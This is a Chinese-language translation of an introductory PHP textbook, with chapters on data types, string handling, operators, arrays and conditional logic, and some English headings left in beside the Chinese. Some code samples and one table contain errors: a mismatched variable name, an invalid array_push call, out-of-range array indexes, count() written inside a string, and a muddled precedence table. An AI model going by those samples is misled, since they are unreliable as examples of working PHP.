所有数据最终都用 1 和 0 表示给计算机。然而，编程语言解释器或编译器必须在正确将数据转换为计算机可用的格式之前知道数据类型表示。像其他几种编程语言（例如，JavaScript）一样，PHP 是一种动态类型语言（与 Java 等静态类型语言相反）。变量会根据分配给它的值的类型或其使用的上下文隐式动态更改其类型。

### 标量数据类型

PHP 支持以下标量数据类型：

- 布尔
- 整数
- 浮点数
- 字符串

## 3. 为什么变量很重要

### 布尔值

布尔数据类型包含一个逻辑值，要么是 TRUE 要么是 FALSE。布尔值通常用于条件逻辑语句中：

```
$passed_drivers_license_exam = TRUE;

if ($passed_drivers_license_exam == TRUE)
{
    echo "Award driver's license.<br/>";
}
```

在线 PHP 文档中有关于布尔数据类型的更多信息[4]。

### 整数

整数数据类型包含一个可以为负、零或正的整数。它们通常以基数-10 数系统表示，但也可以使用基数 2、8、10 或 16 表示。

有关更多信息，请参阅 PHP 文档中关于整数数据类型的部分[5]。

### 浮点数

浮点数据类型包含实数，可以使用小数和/或科学计数法表示：

```
// Pascal to Pound per square inch
$pa_to_psi = 0.000145037738;

// Pascal to Pound per square inch
$pa_to_psi = 145037738e-12;

// Pascal to Pound per square inch
$pa_to_psi = 1.45037738e-4;
```

有关浮点数据类型的更多信息，请参阅 PHP 文档[6]。

[4] 布尔数据类型： http://php.net/language.types.boolean
[5] 整数数据类型： http://php.net/language.types.integer
[6] 浮点数据类型： http://php.net/language.types.float

### 字符串

字符串是一组字符，用单引号（'）或双引号（"）括起来。开始引号的类型必须与结束引号匹配：

```
echo "This is a string";
echo 'This is also a string';
echo "This is a string with 'single-quotes' embedded";
echo 'This is a string with "double-quotes" embedded';
```

如果你有一个用双引号（"）包围的字符串，你可以通过使用反斜杠（\）转义它来在字符串中包含双引号。同样，如果它们位于用单引号包围的字符串内部，你可以通过转义来嵌入单引号：

```
echo "This is a string surrounded by \\";
echo 'I don\'t like using contractions';
```

有关字符串数据类型的更多信息，请参阅 PHP 手册[7]。

### 复合数据类型

PHP 定义了几种“复合”数据类型，允许你在单个实体下包含或聚合同一数据类型的多个数据片段。PHP 支持以下复合数据类型：

- 数组
- 对象
- 可调用
- 可迭代

### 数组

PHP 中的数组是有序映射，是一种将键与其对应值关联的方式。因此，PHP 中的数组被称为“关联数组”。

数组是使用 array() 语言结构创建的。以下是如何创建一个空数组：

```
$fahrenheit_temperatures = array();
```

> *PHP 还支持简短数组语法，这让你可以像这样定义数组：*
> `$temperatures = [];`

要将值（或推送）添加到数组末尾，请在变量名后立即使用 [] 语法。在向数组添加值时不指定键，键将是下一个整数值：

```
$fahrenheit_temperatures[] = 32; // 32 is associated with key 0
$fahrenheit_temperatures[] = 100; // 100 is associated with key 1
```

键可以使用字符串或整数指定。关联数组通常使用字符串作为键，以赋予它们在数组中关联的值以意义。要使用命名键初始化数组，请使用火箭（=>）运算符：

```
$us_state_capitals = array(
    "Wisconsin" => "Madison",
    "California" => "Sacramento"
);
```

要在数组末尾添加一个命名键，请在 [] 之间指定它：

```
$us_state_capitals["Florida"] = "Tallahassee";
```

请注意数组键是唯一的，因此如果你指定一个已存在的键，你将替换其值。

查看数组内容的一个有用函数是 print_r()[8]。将 print_r() 嵌入 <pre> 标签集中，如清单 3.1 所示。

### 清单 3.1.

```
1. <pre>
2. <?php
3. $us_state_capitals = array(
4.     "Wisconsin" => "Madison",
5.     "California" => "Sacramento"
6. );
7. 
8. print_r($us_state_capitals);
9. ?>
10. </pre>
```

[8] print_r()： http://php.net/print_r

此函数调用产生以下输出：

```
Array
(
        [Wisconsin] => Madison
        [California] => Sacramento
)
```

你可以在网上找到有关数组数据类型的更多信息[^9]。

### 对象

PHP 是一种“面向对象”的编程语言，它允许你创建对象。对象是从“类”定义创建的。类定义就像复杂类型，允许你将程序数据（程序知道什么）和程序函数（程序做什么）分组到一个地方，以更好地表示软件中的模块化组件。我们将在本书后面更详细地介绍面向对象编程。

要创建对象，你可以使用 new 关键字从类定义中“实例化”它，如清单 3.2 所示。

### 清单 3.2.

```
<?php

class Radio
{
    function turnOnRadio()
    {
        echo "Turning radio on";
    }
}

$car_radio = new Radio();
$car_radio->turnOnRadio();
```

PHP 手册中有关于对象的更多信息[^10]。

[^9] 数组数据类型： http://php.net/language.types.array
[^10] 对象： http://php.net/language.types.object

### 可调用

“可调用”可以在 PHP 中通过将要调用的函数命名为字符串并使用 call_user_func() 函数[11] 调用它来创建。你可以用简单函数、静态类方法和已实例化类方法来做到这一点。以下是使用回调的简单示例。

```php
function exampleCallbackFunction()
{
    echo "Hello world!";
}

call_user_func('exampleCallbackFunction');
```

有关可调用的更多信息[12]，请查阅在线手册。

### 可迭代

An iterable[13] is a pseudo-type. It enforces arguments to functions or return values from functions are traversable like arrays. You may see this typehint when looking at the API for PHP functions. It mainly means that you can loop through the variable using a foreach.

### 特殊数据类型

PHP 还定义了一些特殊数据类型。这些是：

- 资源
- NULL

### 资源

“资源”是一个包含对外部资源引用的特殊变量。资源通常用于处理文件和数据库：

```php
$db_connection = mysqli_connect(
    'localhost', 'db_user', 'db_password', 'db_to_use'
);

$file_handle = fopen('file.txt', 'r');
```

有关资源[14]及其用法的更多信息，请参阅在线文档。

[11] call_user_func() 函数： http://php.net/call_user_func
[12] 可调用： http://php.net/language.types.callable
[13] 可迭代： http://php.net/language.types.iterable
[14] 资源： http://php.net/language.types.resource



## NULL

“NULL” 值[15] 是一个不包含值的特殊变量。变量在以下情况下为 NULL：

- 它被赋值为常量 NULL，
- 它尚未被赋予任何值，
- 或它已被 unset()。

## Constants

常量是不会改变的值。命名常量在 PHP 中使用 define()[16] 函数创建：

```
define("BOILING_TEMP_IN_CELSIUS", 100);
echo BOILING_TEMP_IN_CELSIUS; // outputs 100
```

## Exercises

创建脚本 variables.php 并执行以下操作：

- 1. 为两个变量分配数字并 echo 它们的值。
- 2. 创建一个变量来保存姓名，echo 字符串 "Hello NAME"，其中 NAME 是变量的值。
- 3. 定义一个表示重力加速度（9.81 m/s）的常量。Echo 该常量的值。

[15] “NULL” 值: http://php.net/language.types.null
[16] define(): http://php.net/function.define

## Chapter 4

### Basic String Interpretation

### 基本字符串解释

> > “软件工程的目的是控制复杂性，而不是制造复杂性。”
> > 
> > - Pamela Zave

### Concatenation

### 连接

在 PHP 中，字符串可以通过使用点 (.) 运算符连接起来拼接：

```
$name = "Fred Flintstone";
echo "Hello " . $name . " !";
```

输出结果为：

```
Hello Fred Flintstone!
```

你也可以使用复合赋值运算符 .= 逐步将内容连接到字符串变量上：

```
$some_fruit = "apple";
$some_fruit .= ", orange";
$some_fruit .= ", banana";
echo "Here are some fruit: " . $some_fruit . ".";
```

输出结果为：

```
Here are some fruit: apple, orange, banana.
```

### Interpolation

### 插值

在 PHP 中，当变量使用双引号 (" ) 包含在字符串中时，变量的内容会被插值，即在字符串中输出变量的值。举例会有帮助：

```
$name = "Fred Flintstone";
echo "Hello $name, how are you today?";
```

输出结果为：

```
Hello Fred Flintstone, how are you today?
```

然而，变量插值在由单引号 (') 定义的字符串中不起作用。单引号之间的内容会被原样输出到网页上：

```
$name = "Fred Flintstone";
echo 'Hello $name, how are you today?';
```

输出结果为：

```
Hello $name, how are you today?
```

### Escaping

### 转义

字符串可以用双引号 (" ) 或单引号 (') 包含。要在单引号字符串中使用字面上的 '，必须使用反斜杠 \ 字符对其进行转义：

```
echo 'You\'re an awesome programmer!';
```

输出结果为：

```
You're an awesome programmer!
```

要在双引号字符串中使用字面上的 "，也必须对其进行转义（使用 \）：

```
echo "A famous programmer, Olav Mjelde said, \"They don't make bugs like Bunny anymore.\"";
```

输出结果为：

```
A famous programmer, Olav Mjelde said, "They don't make bugs like Bunny anymore."
```

请注意，双引号包含的字符串可以包含单引号而无需转义。同样，单引号包含的字符串可以包含双引号而无需转义后者：

```
echo 'Jane said, "Hi John!"<br/>';
echo "John said, 'Hi Jane!'";
```

此代码输出：

```
Jane said, "Hi John!"
John said, 'Hi Jane!'
```

请参阅在线文档了解有关单引号字符串[^1] 和双引号字符串及字符串转义字符[^2] 的更多信息。

[1] 单引号字符串: http://phpa.me/php-single-strings
[2] 字符串转义字符: http://php.net/language.types.string.php#language.types.string.syntax.double

### Heredoc

### Heredoc

PHP 定义了一种特殊的字符串定界方式，称为 heredoc，它允许你在 <<< 序列后定义一个标识符，后跟换行符。EOT（“end of text”）是常用的字符序列用作标识符。从这一行之后直到同一标识符后跟分号 ; 在其单独一行上的所有内容都被定界为字符串。这种语法允许你在无需转义单引号或双引号的情况下定义大段文本：

```
echo <<<EOT
Cupcake ipsum dolor. Sit amet cake ice cream sweet pudding
tootsie roll marshmallow cake. "Lemon" drops apple pie fruitcake
caramels lollipop's sweet roll. Sesame snaps lemon drops topping.
EOT;
```

输出结果为：

```
Cupcake ipsum dolor. Sit amet cake ice cream sweet pudding
tootsie roll marshmallow cake. "Lemon" drops apple pie fruitcake
caramels lollipop's sweet roll. Sesame snaps lemon drops topping.
```

在线文档对字符串[3] 有更详细的说明。

### Exercises

### 练习

创建脚本 strings.php 执行以下操作：

- 1. 将名字和姓氏分别赋给两个变量。然后，使用连接输出全名。
- 2. 再次使用名字和姓氏，使用字符串插值输出姓氏、逗号，然后是名字。
- 3. 将姓氏设置为 “O’Connor” 并输出全名。

[3] 字符串: http://php.net/language.types.string

## Chapter 5

## 第 5 章

## Operators, Expressions, and Basic Arithmetic

## 运算符、表达式和基本算术

> “如果它不能正常工作也不用担心。如果一切都正常，你就失业了。”
> – Mosher’s Law of Software Engineering

### Operators and Expressions

### 运算符和表达式

#### Operators

#### 运算符

运算符是根据某些规则产生结果的符号。示例包括：

| 部分运算符 |
|---| 
| + |
| - |
| = |
| < |
| > |

运算符可以在左侧或右侧被操作数包围。

#### Operands

#### 操作数

操作数是被运算符操作的数据对象。操作数可以是字符串、数字、布尔值、对象或它们的组合。

#### Expressions

#### 表达式

表达式是一组运算符和操作数，由 PHP 解释器进行求值。图 5.1 显示了一个表达式的简单示例。

![](img/83a2e1d9463a10cf8d6f7fe54ee4b1c7_58_0.png)

#### Assignments

#### 赋值

字面值和变量的内容使用赋值 (=) 运算符赋给变量。= 左侧的变量被赋予 = 右侧变量的值或内容。请查阅手册以了解赋值运算符[1] 的完整说明。

[1] 赋值运算符: http://php.net/language.operators.assignment

以下是使用 = 运算符的示例：

```
$temperature_fahrenheit = 32;
$current_temperature = $temperature_fahrenheit;
```

#### Compound Assignment operators

#### 复合赋值运算符

像许多现代编程语言一样，PHP 具有复合赋值运算符。以下是使用算术复合赋值运算符的几个示例：

| 复合赋值 | 等价于... | 含义 |
|---|---|---|
| $a += $b | $a = $a + $b | 加法 |
| $a -= $b | $a = $a - $b | 减法 |
| $a *= $b | $a = $a * $b | 乘法 |
| $a /= $b | $a = $a / $b | 除法 |
| $a %= $b | $a = $a % $b | 取模 |

#### Operator Precedence

#### 运算符优先级

在 PHP（以及许多其他编程语言）中，优先级决定了运算符的求值顺序及其结合性。以下表格列出了所有 PHP 运算符的优先级和结合性：

| 运算符 | 描述 | 结合性 |
|---|---|---|
| () | 括号 | 从左到右 |
| new | 创建对象 | 非结合 |
| [] | 数组下标 | 从右到左 |
| ++ -- | 自动递增、递减 | 非结合 |
| ! ~ - | 逻辑非、按位非、取反 | 非结合 |
| (int) (float) (string) (array) (object) | 类型转换 | 右 |
| instanceof | 判断变量是否为某个类的实例化对象 | 左 |
| ! | 非 | 非结合 |
| () | 括号 | 从左到右 |
| * / . | 算术乘、除、字符串连接 | 左 |
| << >> | 按位左移、右移 | 左 |
| < <= > >= | 小于、小于等于、大于、大于等于比较 | 非结合 |
| & | 按位与 | 左 |
| ^ | 按位异或 | 左 |
| | | 按位或 | 左 |
| && | 逻辑与 | 左 |
| || | 逻辑或 | 左 |
| ?? | 空合并 | 右 |
| = += -= *= **= /= .= %= &= |= ^= <<= >>= ??= | 赋值、复合赋值、复合取模、复合按位逻辑、复合按位移位、复合空合并 | 右 |

请参阅在线文档了解有关运算符优先级[2] 的更多信息。

#### Basic Arithmetic

#### 基本算术

像许多编程语言一样，PHP 提供了五种基本算术运算符：

| 运算符 | 名称 | 示例 | 含义 |
|---|---|---|---|
| + | 加法 | $a + $b | 和 |
| - | 减法 | $a - $b | 差 |
| * | 乘法 | $a = $a * $b | 积 |
| / | 除法 | $a / $b | 商 |
| % | 取模 | $a % $b | 余数 |

[2] 运算符优先级: http://php.net/language.operators.precedence



## 5. 运算符、表达式与基本算术

在执行除法时，如果除数能被被除数整除，`/` 运算符返回一个整数，否则返回一个浮点数：

```php
$whole_number = 12 / 4   // $whole_number will be an integer (3)
$float_value = 7 / 2    // $float_value will be a float (3.5)
```

*取模*（`%`）运算符返回除法运算的余数。*取模*运算符的一个典型用途是判断一个数是奇数还是偶数：

```php
if (($odd_or_even % 2) == 1)
{
    echo "$odd_or_even is an odd number.";
}
else if (($odd_or_even % 2) == 0)
{
    echo "$odd_or_even is an even number.";
}
```

这可以进一步简化为：

```php
if (($odd_or_even % 2) == 1)
{
    echo "$odd_or_even is an odd number.";
}
else
{
    echo "$odd_or_even is an even number.";
}
```

PHP 文档提供了有关基本算术运算符的更多信息。[^3]

> [^3]: 基本算术运算符：[http://php.net/language.operators.arithmetic](http://php.net/language.operators.arithmetic)

### 数学函数

PHP 语言提供了一套相对标准的数学函数供你使用。下面是一些常见数学函数的示例。

### abs()

abs() 函数返回给定参数的绝对值：

```php
$value = -42;
$absolute_value = abs($value);
echo "The absolute value of $value is $absolute_value";
```

输出：

```
The absolute value of -42 is 42
```

### pow()

pow() 函数返回以第一个参数为底、第二个参数为指数的幂值：

```
echo pow(10, 3) . '<br/>'; // 1000
echo pow(10, -1) . '<br/>'; // 0.1
```

输出：

```
1000
0.1
```

### round()

round() 函数返回给定参数按默认或指定的小数位数精度四舍五入后的值。如果未指定精度，默认精度为 0：

```
echo round(4.4) . '<br/>'; // 4
echo round(4.5) . '<br/>'; // 5
```

输出：

```
4
5
```

更多数学函数信息请参阅在线文档[4]。

[4] 数学函数：http://php.net/ref.math

### 练习

请为以下练习创建一个脚本 operators.php：

- 1. 将两个数值分别赋给不同的变量。输出这两个数以及它们的和、差、积、商，每个占一行。
- 2. 输出上述两个值的模。
- 3. 使用 pow() 将第一个值分别提高到二次幂和三次幂，并输出每个结果。
- 4. 将第二个值乘以 1.15，四舍五入到最接近的整数——加分项：将其四舍五入到小数点后两位。输出你的结果。

## 第6章 数组

> “Python 是 BASIC 的直接替代品，就如同擎天柱是卡车的直接替代品一样。”
> 
> - Cory Dodt

当我们拥有逻辑上相互关联的数据时，通常希望将这些数据组合到一个单独的数据结构中来容纳它们。收集一组相关信息最基本的数据结构就是数组。

PHP 中的数组是一种有序映射，它将值与键关联起来。PHP 中的数组可以使用整数或字符串作为键，并与相应的值匹配。

### PHP 中的简单数组

简单数组使用整数作为键，通常从 0 开始，一直到 n-1（n 是数组中的元素个数）。这种实现方式类似于其他编程语言中访问数组的方式。这类数组被称为“数字”数组或“索引”数组。

### 创建

以下是在 PHP 中创建数字数组的方法：

```
$us_states = array(); // Empty array

// Populated array
$us_states = array("California", "Florida", "Wisconsin");
```

### 短数组语法

在 PHP 5.4 版本之前，程序员必须使用 array() 函数来创建数组。PHP 5.4 引入了短数组语法，允许使用方括号（[ & ]）创建数组。下面演示如何使用短数组语法创建上述数组：

```
$us_states = []; // Empty array (short array syntax)

// Populated array (short array syntax)
$us_states = ["California", "Florida", "Wisconsin"];
```

### 访问单个元素

以 $us_states 为例，我们可以通过数字键访问数组的各个值。数字数组的索引键从 0 开始，我们通过将键放在数组变量名后面的一组方括号（[ & ]）中来访问对应的值：

```
echo "Sacramento is the capital of $us_states[0].<br/>";
echo "Tallahassee is the capital of $us_states[1].<br/>";
echo "Madison is the capital of $us_states[2].";
```

### 关联数组

关联数组使用字符串作为键，与数组中的值建立关联。

### 枚举数组与关联数组

关联数组非常有用，因为它允许开发者将一个有意义的单词作为键与值关联，而不必依赖任意的数值——这些数值通常与其映射的值没有明显关联。

### 创建

在 PHP 中创建关联数组的语法稍有不同，因为在创建键值对元素时，需要同时指定键及其关联的值。键和值之间用 => 运算符（有时称为“火箭”运算符）分隔：

```
$us_state_capitals = array(
  "California" => "Sacramento",
  "Florida" => "Tallahassee",
  "Wisconsin" => "Madison"
);
```

### 短数组语法

下面演示如何使用短数组语法创建上述数组：

```
$us_state_capitals = [
  "California" => "Sacramento",
  "Florida" => "Tallahassee",
  "Wisconsin" => "Madison"
];
```

### 访问单个元素

以 $us_state_capitals 为例，我们可以通过关联键访问数组中的各个值。与数字数组类似，将键放在数组变量名后的方括号（[ & ]）中即可访问对应值：

```
echo "The capital of California is {$us_state_capitals['California']}.<br/>";
echo "The capital of Florida is {$us_state_capitals['Florida']}.<br/>";
echo "The capital of Wisconsin is {$us_state_capitals['Wisconsin']}.<br/>";
```

### 添加值

PHP 中的数组是可变的。也就是说，它们在初始创建之后可以被修改。这一特性使我们可以向数组中添加和删除元素。

有两种方法可以将值添加到数组末尾。第一种是使用 array_push()[1] 函数：

```
// Add value to end of numeric array
array_push($us_states, 'Wisconsin');

// Add value to end of associative array
array_push($us_state_capitals, 'California' => 'Sacramento');
```

第二种是使用以下语法：

```
// Add value to end of numeric array
$us_states[] = 'Wisconsin';

// Add value with this key to end of associative array
$us_state_capitals['California'] = 'Sacramento';
```

### 显式语法与短数组语法

通常，短数组语法比使用 array 关键字更受青睐，因为它更加简洁。

### 有用的数组函数

### count()

你常常需要知道数组中有多少个元素。count()[2] 函数返回数组中的元素个数：

```
$us_states_i_lived_in = ["California", "Florida", "Wisconsin"];
$number_of_states = count($us_states_i_lived_in);

echo "I have lived in $number_of_states<br/>";
```

[1] array_push(): http://php.net/array-push
[2] count(): http://php.net/count

### array_pop()

如果需要获取数组的最后一个元素并将其从数组中移除，可以使用 array_pop()[3] 函数。下面是一个使用示例：

```
$us_states = ["California", "Florida", "Wisconsin"];
$last_state = array_pop($us_states);

echo "I currently live in $last_state<br/>"; // Wisconsin
// Count of $us_states is now 2
echo "There are now count($us_states) left in the us_states array";
```

### array_shift()

如果需要获取数组的第一个元素并将其从数组中移除，可以使用 array_shift()[4] 函数。下面是一个使用示例：

```
$us_states = ["California", "Florida", "Wisconsin"];
$first_state = array_shift($us_states);

echo "I was born in $first_state<br/>"; // California
// Count of $us_states is now 2
echo "There are now count($us_states) left in the us_states array";
```

### array_merge()

array_merge()[5] 函数将一个或多个数组追加到前一个数组的末尾：

```
$us_states = ["California", "Florida", "Wisconsin"];
$more_us_states = ["Virginia", "Maryland", "New York"];
$merged_us_states = array_merge($us_states, $more_us_states);

echo "<pre>";
print_r($merged_us_states);
echo "</pre>";
```

[3] array_pop(): http://php.net/array_pop
[4] array_shift(): https://php.net/array_shift
[5] array_merge(): http://php.net/array_merge




## 6. 数组

结果为：

```
Array
(
    [0] => California
    [1] => Florida
    [2] => Wisconsin
    [3] => Virginia
    [4] => Maryland
    [5] => New York
)
```

### array_key_exists()

array_key_exists()^[6]^ 用于检查给定键是否存在于数组中（列表 6.1）。

### 列表 6.1.

```php
<?php
$us_state_capitals = [
"California" => "Sacramento",
"Florida" => "Tallahassee",
"Wisconsin" => "Madison"
];
if (array_key_exists('California', $us_state_capitals))
{
echo "{$us_state_capitals['California']} is the capital of California<br/>";
}
if (!array_key_exists('Montana', $us_state_capitals))
{
echo "The key 'Montana' was not found in us_state_capitals<br/>";
}
```

结果为：

```
Sacramento is the capital of California.
The key 'Montana' was not found in us_state_capitals.
```

### array_keys()

为了获取数组的所有键，可以使用 array_keys()^[7]^ 函数，如列表 6.2 所示。

[6] array_key_exists(): https://php.net/array_key_exists
[7] array_keys(): http://php.net/array_keys

### 列表 6.2.

```php
1. $us_state_capitals = [
2.     "California" => "Sacramento",
3.     "Florida" => "Tallahassee",
4.     "Wisconsin" => "Madison"
5. ];
6. 
7. echo "<pre>";
8. print_r(array_keys($us_state_capitals));
9. echo "</pre>";
```

结果为：

```
Array
(
    [0] => California
    [1] => Florida
    [2] => Wisconsin
)
```

如果你只想查找映射到数组中包含的值（或值）的键（或键），这里有一个示例，如列表 6.3 所示。

### 列表 6.3.

```php
1. $us_state_capitals = [
2.     "California" => "Sacramento",
3.     "Florida" => "Tallahassee",
4.     "Wisconsin" => "Madison"
5. ];
6. 
7. echo "<pre>";
8. print_r(array_keys($us_state_capitals, "Madison"));
9. echo "</pre>";
```

结果为：

```
Array
(
    [0] => Wisconsin
)
```

## 6. 数组

### array_values()

为了获取数组的所有值，可以使用 array_values()[8] 函数，如下所示在列表 6.4 中。

### 列表 6.4.

```php
$us_state_capitals = [
    "California" => "Sacramento",
    "Florida" => "Tallahassee",
    "Wisconsin" => "Madison"
];
echo "<pre>";
print_r(array_values($us_state_capitals));
echo "</pre>";
```

结果为：

```
Array
(
    [0] => Sacramento
    [1] => Tallahassee
    [2] => Madison
)
```

### array_splice()

array_splice()[9] 是一个有用的函数，我们可以用它从数组中删除一段元素，并用另一段元素替换该范围或不替换。列表 6.5 是一个从数组中删除项目的示例。

### 列表 6.5.

```php
$us_states = [
    "California",
    "Arizona",
    "Florida",
    "Wisconsin"
];
array_splice($us_states, 1, 2); // Removes 'Arizona' and 'Florida'
echo "<pre>";
print_r($us_states);
echo "</pre>";
```

[8] array_values(): http://php.net/array_values
[9] array_splice(): http://php.net/array_splice

## 有用的数组函数

结果为：

```
Array
(
[0] => California
[1] => Wisconsin
)
```

列表 6.6 是一个示例，用另一个数组中的所有元素替换被删除的部分。

```php
$us_states = [
    "California",
    "Arizona",
    "Florida",
    "Wisconsin"
];
$more_us_states = ["Virginia", "New York"];
// Removes 'Arizona' and 'Florida', and replaces
// them with 'Virginia' and 'New York'
array_splice($us_states, 1, 2, $more_us_states);
echo "<pre>";
print_r($us_states);
echo "</pre>";
```

结果为：

```
Array
(
[0] => California
[1] => Virginia
[2] => New York
[3] => Wisconsin
)
```

## 6. 数组

### 排序

在填充数组后，你可能需要按排序顺序处理它。asort()[10] 会按值排序重新排列数组并保留键值对。列表 6.7 是一个示例，其中美国州首府按字母顺序重新排序。

### 列表 6.7.

```php
$us_state_capitals = [
    "California" => "Sacramento",
    "Florida" => "Tallahassee",
    "Wisconsin" => "Madison"
];

asort($us_state_capitals);

echo "<pre>";
print_r($us_state_capitals);
echo "</pre>";
```

结果为：

```
Array
(
    [Wisconsin] => Madison
    [California] => Sacramento
    [Florida] => Tallahassee
)
```

> *PHP 提供了许多用于排序数组的内置函数。例如，如果你需要反向排序数组，请使用 arsort()[11]。完整列表请参阅“排序数组”[12]。*

### 多维数组

我们迄今为止处理的数组都是单维数组。然而，像许多其他编程语言一样，PHP 允许创建多维数组。一种可视化多维数组的方法是把每个维度想象成数字的轴。例如，单维数组可以是值的一条单数字线，如 X 轴。利用这个隐喻，你可以把二维数组想象成 X 轴和 Y 轴，可能代表区域内的点。进一步延伸，三维数组可以代表 X、Y 和 Z 轴，代表体积内的点。

多维数组适用于数值数组和关联数组。列表 6.8 是创建和访问一个二维数值数组的示例，该数组保存了一个“Battleship”游戏的简单网格。

```php
$battleship_grid = [
    ["miss", "miss", "miss"],
    ["miss", "miss", "hit"],
    ["miss", "miss", "hit"],
    ["miss", "miss", "hit"]
];

// Coordinates to sink my battleship
echo "{$battleship_grid[1][3]}",
"{$battleship_grid[2][3]}",
"{$battleship_grid[3][3]}";
```

结果为：

hit, hit, hit

列表 6.9 是如何创建和访问一个二维关联数组的示例，该数组保存了一些按 Oscar 和我居住过的州为键的城市。

```php
$sus_cities_we_lived_in = [
    "Ken" => [
        "California" => "San Diego",
        "Florida" => "Orlando",
        "Wisconsin" => "Madison"
    ],
    "Oscar" => [
        "New York" => "New York",
        "Maryland" => "Baltimore",
        "Virginia" => "Richmond"
    ]
];

echo "I live in {$sus_cities_we_lived_in['Ken']['Wisconsin']}<br/>";
echo "and Oscar lives in {$sus_cities_we_lived_in['Oscar']['Virginia']}";
```

[10] asort(): http://php.net/asort
[11] arsort(): http://php.net/arsort
[12] “Sorting Arrays”: https://php.net/arrays.sorting

## 6. 数组

结果为：

```
I live in Madison,
and Oscar lives in Richmond.
```

有关数组的更多信息，请参阅在线文档[13]。

为以下内容创建脚本 arrays.php：

- 1. 创建一个数组来保存至少五个书名的列表。输出第三本和第四本书的标题。
- 2. 创建一个关联数组来保存至少三本图书标题及其作者的列表。以书名为键。输出每本书的标题和作者，每行一个。
- 3. 在上面的图书列表中追加另一本书和作者。使用 print_r() 查看数组的结构。
- 4. 输出图书列表中图书的数量。
- 5. 使用 asort() 按标题对图书进行排序。使用 print_r() 确认数组已正确排序。

> [13] arrays: http://php.net/language.types.array

## 第 7 章

## 真值、比较、条件和复合条件

> "我曾经做过一个噩梦，在梦里我让朋友相信 C++ 是多么 wonderful。过了一会儿他回来了，而且很生气。"
> 
> - Robin Rosenberg

### 什么是相等？

- == 测试值是否相等
- === 测试值是否相等且数据类型是否相同

== 运算符会在相等性测试中进行自动类型转换，参见列表 7.1。

### 列表 7.1.

```php
$age_string = "18";
if ($age == 18)
{
    echo 'You can vote';
}
else
{
    echo 'You can not vote';
}
```

输出如下：

```
You can vote
```

然而，=== 要求两个值在类型相同且相等时才为真，如列表 7.2 所示。

### 列表 7.2.

```php
$age_string = "18";
if ($age === 18)
{
    echo 'You can vote';
}
else
{
    echo 'You can not vote';
}
```

其结果为：

```
You can not vote
```


## 条件逻辑

你已经了解了简单的 if/else 语句是如何工作的。我们来看看在 PHP 中编写条件语句的其他方式。

### if/else if/else

一个典型的 if/else 语句块如清单 7.4 所示。

### 清单 7.4

```php
if ($age > 18)
{
    echo 'You can vote';
}
elseif ($age > 16)
{
    echo 'You can drive';
}
else
{
    echo 'Get back to school!';
}
```

你也可以将条件逻辑直接嵌入 HTML 中，如下所示：

```php
<?php if ($age > 18) : ?>
    <h1>You can vote</h1>
<?php elseif ($age > 16) : ?>
    <h1>You can drive</h1>
<?php else : ?>
    <h1>Get back to school!</h1>
<?php endif; ?>
```

请注意，在上述示例中，当使用花括号（{}）时，`else if` 也可以替换为 `elseif`[^1]。但是，当使用冒号（:）来定义 if/elseif 条件时，如果你把 `elseif` 拆分成两个词（即 `else if`），则会导致解析错误。

[^1]: elseif: http://php.net/control-structures.elseif

## 7. 真值、比较、条件与复合条件

大多数现代编程语言都有一个三元运算符，其作用本质上类似于 if/else 语句的简写形式。假设你需要一段代码，其中包含一个布尔值，用于指示某人是否已达到投票年龄。清单 7.5 展示了一种编写方式。

```
1. $able_to_vote = NULL;
2. if ($age > 18) {
   $able_to_vote = true;
}
else {
   $able_to_vote = false;
}
```

更简洁的写法是使用三元运算符，如下所示：

```
$able_to_vote = ($age > 18) ? true : false;
```

三元运算符在两个括号之间放置一个条件语句，后面跟着一个问号（?），然后是条件为真时赋的值，再后跟一个冒号（:），最后是条件为假时赋的值。你通常需要创建一个变量，并将三元运算的结果赋值给该变量。更多信息请参阅三元运算符[2]文档。

> [2] 三元运算符：http://php.net/manual/en/language-operators.php

## Switch

另一种编写条件语句的实用方式是使用 `switch` 和多个 `case` 语句。当程序员需要检查的条件超过四个时，通常会使用 `switch` 语句。清单 7.6 是使用 `switch` 和 `case` 语句的示例。

### 清单 7.6

```php
1. $hungry_for = 'ice cream'
2. switch ($hungry_for)
3. {
4.     case 'burgers':
5.         echo 'The Nitty Gritty on Frances St. is great!';
6.         break;
7.     case 'ice cream':
8.         echo 'Get some Babcock Ice Cream at the Memorial Union at UW Madison!';
9.         break;
10.    case 'chocolate':
11.        echo 'Gail Ambrosius Chocolatier on Atwood Ave. is my favorite!';
12.        break;
13.    case 'laotian':
14.        echo 'Lao Laan Xang on Atwood Ave. is the best!';
15.        break;
16.    default:
17.        echo 'There are so many great places to eat in Madison!!';
18.        break;
19. }
```

`switch` 语句将包含多个 `case` 语句，每个 `case` 以冒号（:）结尾。当 `case` 与 `switch` 后面括号中指定的变量匹配时，将执行冒号（:）后面的代码语句，直到遇到第一个 `break` 语句。因此，在大多数情况下，用 `break` 语句分隔各个 `case` 语句非常重要。请注意，最佳实践是始终包含一个 `default` 分支，即使你预期它不会被执行。它在调试和错误处理中非常有帮助。

## 使用逻辑运算符的复合条件逻辑

通过组合各种逻辑运算符，我们可以创建相当复杂的条件。

### 逻辑运算符

PHP 定义了多个逻辑运算符。下表列出了它们：

| 运算符 | 示例 | 含义 | 结果 |
|---|---|---|---|
| && | $a && $b | 与 | 如果 $a 和 $b 都为真，则为真 |
| || | $a || $b | 或 | 如果 $a 或 $b 任一为真，则为真 |
| ! | !$a | 非 | 如果 $a 为假，则为真 |
| xor | $a xor $b | 异或 | 如果 $a 或 $b 任一为真但不都为真，则为真。（以不同优先级运算） |
| and | $a and $b | 与 | 如果 $a 和 $b 都为真，则为真。（以不同优先级运算） |
| or | $a or $b | 或 | 如果 $a 或 $b 任一为真，则为真。（以不同优先级运算） |

请注意，`and`、`or` 和 `xor` 的运算符优先级[3]低于 `&&` 和 `||`。我不推荐使用 `and` 和 `or`，而是更倾向于使用 `&&` 和 `||`，原因有几个。首先，如前所述，`or` 和 `and` 以不同的优先级运算，为了正确使用，几乎总是需要使用括号。其次，几乎所有现代编程语言都已标准化使用 `||` 表示逻辑或，使用 `&&` 表示逻辑与。关于 `xor`，如果 `^^` 能被用作逻辑异或的标准符号，并且具有与 `&&` 和 `||` 相同的优先级，那将会很好，然而大多数编程语言没有逻辑异或符号。一个具有相同优先级的良好解决方案是：`!$a != !$b`。

### 复合条件语句

在条件语句中组合逻辑运算符可以非常方便，并提高代码的可读性。考虑这样一个问题：仅当某个数字在特定范围内时才执行某些代码。假设我们只想在学生考试分数介于 80 到 90 分（含边界）之间时，为其分配字母等级“B”。我们可以使用清单 7.7 中的代码来解决这个问题。

[3] 运算符优先级：http://php.net/language.operators.precedence

## 使用逻辑运算符的复合条件逻辑

